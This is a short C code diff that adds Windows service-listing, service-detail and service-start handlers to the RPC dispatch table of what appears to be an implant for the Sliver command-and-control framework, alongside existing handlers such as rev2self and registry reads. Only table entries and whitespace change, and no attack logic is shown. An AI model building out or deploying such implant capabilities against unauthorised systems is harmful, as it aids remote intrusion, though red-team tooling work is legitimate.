@@ -930,7 +930,10 @@ static const rpc_entry_t g_handlers[] = {
     {136, 136, handle_execute_children},
     {129, 129, handle_grep},
 #if defined(_WIN32)
-        {31, 31, handle_rev2self},
+        {130, 130, handle_services},
+    {131, 131, handle_service_detail},
+    {132, 132, handle_service_start},
+    {31, 31, handle_rev2self},
 #endif
 #if defined(_WIN32)
     {71, 71, handle_reg_read},
@@ -999,6 +1002,7 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
 
 
 
